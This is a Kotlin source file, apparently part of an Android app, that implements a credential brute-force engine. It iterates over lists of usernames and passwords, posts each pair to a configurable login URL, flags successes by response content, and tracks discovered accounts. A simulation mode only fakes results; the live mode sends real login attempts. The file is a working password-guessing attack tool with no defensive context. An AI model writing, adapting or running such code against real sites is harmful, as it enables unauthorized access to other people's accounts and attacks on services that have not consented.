package com.hex.app.engine

import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import okhttp3.*
import java.io.IOException

data class Attempt(val username: String, val password: String, val status: String)

class AttackEngine(
    private val users: List<String>,
    private val passwords: List<String>,
    private val stopAfter: Int,
    private val targetUrl: String,
    private val simulation: Boolean
) {
    private val _log = MutableStateFlow<List<Attempt>>(emptyList())
    val log: StateFlow<List<Attempt>> = _log

    private val _progress = MutableStateFlow(Pair(0, users.size * passwords.size))
    val progress: StateFlow<Pair<Int, Int>> = _progress

    private val _discoveries = MutableStateFlow(0)
    val discoveries: StateFlow<Int> = _discoveries

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running

    private var job: Job? = null
    private val client = OkHttpClient()

    fun start(scope: CoroutineScope) {
        if (_running.value) return
        _running.value = true
        _log.value = emptyList()
        _progress.value = Pair(0, users.size * passwords.size)
        _discoveries.value = 0

        job = scope.launch(Dispatchers.IO) {
            val total = users.size * passwords.size
            var processed = 0
            for (user in users) {
                for (pass in passwords) {
                    if (!_running.value) return@launch
                    if (stopAfter > 0 && _discoveries.value >= stopAfter) {
                        _running.value = false
                        break
                    }
                    val status = if (simulation) {
                        delay(20 + (Math.random() * 80).toLong())
                        if (Math.random() < 0.05) "success" else "fail"
                    } else {
                        attemptLogin(user, pass)
                    }
                    val attempt = Attempt(user, pass, status)
                    _log.value = _log.value + attempt
                    processed++
                    _progress.value = Pair(processed, total)
                    if (status == "success") _discoveries.value = _discoveries.value + 1
                }
            }
            _running.value = false
        }
    }

    fun stop() {
        _running.value = false
        job?.cancel()
    }

    private suspend fun attemptLogin(user: String, pass: String): String = withContext(Dispatchers.IO) {
        try {
            val formBody = FormBody.Builder()
                .add("username", user)
                .add("password", pass)
                .build()
            val request = Request.Builder()
                .url(targetUrl)
                .post(formBody)
                .build()
            val response = client.newCall(request).execute()
            if (response.isSuccessful && !response.body?.string()?.contains("invalid")!!) "success" else "fail"
        } catch (e: IOException) { "fail" }
    }
}
